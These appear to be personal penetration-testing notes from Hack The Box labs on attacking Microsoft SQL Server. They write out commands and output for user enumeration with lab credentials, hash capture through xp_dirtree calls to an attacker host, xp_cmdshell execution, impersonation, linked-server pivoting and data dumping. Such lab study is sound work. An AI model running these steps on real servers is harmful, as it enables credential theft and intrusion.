# User Enumeration From SQL account
### Actually i use my script to perform this
-  My Script -> [[SQL users enumeration]]
### Use NXC 
It was easy, and i was stupid creating mine
```BASH
┌──(ali㉿koalasec)-[~/Desktop/htb/eighteen]
└─$ nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute 2000
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts
...
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green

```

# Database Privilege Escalation: xp_dirtree
**xp_dirtree** is a stored procedure that allows you to query the filesystem. By pointing it at a UNC path running responder.py, we can capture the Net-NTLM hash of the service account.
```BASH
SQL (kevin  guest@master)> xp_dirtree \\10.10.15.193\shared
subdirectory   depth   file   
------------   -----   ----   
  ```
- In another way:
```BASH
SQL (kevin  guest@master)> SELECT * FROM sys.dm_os_file_exists ('//10.10.15.193/adsnt.dll')
ERROR(DC01): Line 1: The operating system returned the error '0x80070005(Access is denied.)' while attempting 'SvlPathDoesPathExist' on '//10.10.15.193/adsnt.dll'.
file_exists   file_is_a_directory   parent_directory_exists 
```

# Command Execution
To execute operating system commands on SQL server, we can use the xp_cmdshell stored procedure. We can enable this with impacket using the **enable_xp_cmdshell** command.
```BASH
`SQL (sa  dbo@msdb)> enable_xp_cmdshell`
`[*] INFO(SERVER1): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.`
`[*] INFO(SERVER1): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.`
`SQL (sa  dbo@msdb)> xp_cmdshell whoami`

`output`                  
`----------------------`  
`nt service\mssqlserver`  
`NULL`                    
`SQL (sa  dbo@msdb)> xp_cmdshell hostname`
`output`   
`-------`  
`SERVER1`  

`NULL`
```

# Database Privilege Escalation: Impersonation
SQL server support impersonation, where one account can execute commands in the context of another.
```BASH
SQL (kevin guest@master)> enum_impersonate
execute as database permission_name state_desc grantee grantor
---------- -------- --------------- ---------- ------- ------- 
b'LOGIN' b'' IMPERSONATE GRANT kevin appdev 

SQL (kevin guest@master)> EXECUTE AS LOGIN = 'appdev' SQL (appdev appdev@master)>
```

# Database Privilege Escalation: db_ddladmin Abuse
The [sp_syspolicy_purge_history](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-syspolicy-purge-history-transact-sql?view=sql-server-ver16) stored procedure can be altered by users with the db_ddladmin database role. If we have with role on the MSDB database, this can be used to escalate privileges.
- NOTE: i do not know this 

# Linked Server Exploitation
MSSQL supports a feature called Linked Servers. Essentially the MSSQL database is configured to connect to remote databases running on other systems. This allows you to execute a query against one host, but the data to be retrieved from multiple systems.
If linked servers are configured, and attacker may be able to exploit this feature to move laterally between different database systems.

```
SQL (darkzero\john.w guest@master)> enum_links
SRV_NAME SRV_PROVIDERNAME SRV_PRODUCT SRV_DATASOURCE SRV_PROVIDERSTRING SRV_LOCATION SRV_CAT
----------------- ---------------- ----------- ----------------- ------------------ ------------ -------
DC01 SQLNCLI SQL  Server  DC01                          NULL NULL NULL 
DC02.darkzero.ext SQLNCLI SQL  Server DC02.darkzero.ext NULL NULL NULL 
Linked Server Local Login Is Self Mapping Remote Login
----------------- --------------- --------------- ------------
DC02.darkzero.ext darkzero\john.w 0 dc01_sql_svc 
SQL (darkzero\john.w guest@master)> use "DC02.darkzero.ext" ERROR(DC01): Line 1: Database 'DC02.darkzero.ext' does not exist. Make sure that the name is entered correctly. SQL (darkzero\john.w guest@master)> use_link "DC02.darkzero.ext"
```

# Data Extraction
Databases may contain useful information to perform further attacks, such as credentials. As such, it’s worth examining the contents of the database.
```BASH
SQL (appdev guest@msdb)> SELECT name FROM sys.databases; 
[%] SELECT name FROM sys.databases;
name 
----------------- 
master tempdb model msdb financial_planner 
SQL (appdev guest@msdb)> use financial_planner 
[%] use financial_planner 
SQL (appdev appdev@financial_planner)> SELECT table_name FROM information_schema.tables; 
[%] SELECT table_name FROM information_schema.tables; 
table_name 
----------- 
users
...

SQL (appdev appdev@financial_planner)> select * from users;
```

# SQL Roles
Read about roles...
